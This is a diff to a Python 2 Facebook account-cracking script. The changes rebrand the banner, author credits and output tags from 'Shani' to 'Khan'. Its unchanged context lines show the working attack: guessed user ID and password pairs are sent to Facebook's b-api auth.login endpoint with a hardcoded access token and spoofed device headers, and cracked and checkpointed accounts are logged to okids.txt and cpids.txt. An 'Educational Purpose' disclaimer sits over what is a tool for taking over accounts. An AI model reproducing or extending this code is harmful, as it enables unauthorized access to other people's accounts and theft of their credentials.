@@ -37,15 +37,15 @@ header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-f
 
 logo = """
 
-\033[1;92m\n_____ _    _          _   _ _____ 
-  / ____| |  | |   /\   | \ | |_   _|
- | (___ | |__| |  /  \  |  \| | | |  
-  \___ \|  __  | / /\ \ | . ` | | |  
-  ____) | |  | |/ ____ \| |\  |_| |_ 
- |_____/|_|  |_/_/    \_\_| \_|_____|    
+\033[1;92m\n ____  __.__                 ___.         ___.            .__  __   
+|    |/ _|  |__ _____    ____\_ |__ _____ \_ |__ _____    |__|/  |_ 
+|      < |  |  \\__  \  /    \| __ \\__  \ | __ \\__  \   |  \   __\
+|    |  \|   Y  \/ __ \|   |  \ \_\ \/ __ \| \_\ \/ __ \_ |  ||  |  
+|____|__ \___|  (____  /___|  /___  (____  /___  (____  / |__||__|  
+        \/    \/     \/     \/    \/     \/    \/     \/               
 \n\033[0m----------------------------------
-\033[1;92mAuthor \033[1;93m: ShaniUstad
-\033[1;92mFb \033[1;93m: Zeeshan Qureshi
+\033[1;92mAuthor \033[1;93m: Khanbaba
+\033[1;92mFb \033[1;93m: Zeeshan Altaf
 \033[1;92mDisclaimer \033[1;93m: Its For Educational Purpose
 \033[0m----------------------------------
 
@@ -71,7 +71,7 @@ def log_sel():
 	main()
     elif select == '2':
         os.system('xdg-open https://www.facebook.com/profile.php?id=100070196383159')
-        menu()
+        main()
     elif select == '0':
         os.system('exit')
     elif select == '3':
@@ -375,13 +375,13 @@ def crack_select():
             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
             q = json.loads(data)
             if 'access_token' in q:
-                print '\x1b[1;32m[SHANI-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;32m[Khan-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('okids.txt', 'a')
                 ok.write(uid + '|' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;31m[SHANI-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print '\x1b[1;31m[Khan-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('cpids.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -397,7 +397,7 @@ def crack_select():
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;31m[SHANI-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print '\x1b[1;31m[Khan-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('cpids.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -434,7 +434,7 @@ def crack_select():
     raw_input(' \x1b[1;92m Press Enter To Go Back ! ')
     main()
     
-#THANKX SHANI BRO
+#THANKX KHAN BRO
 
 if __name__ == '__main__':
     menu()
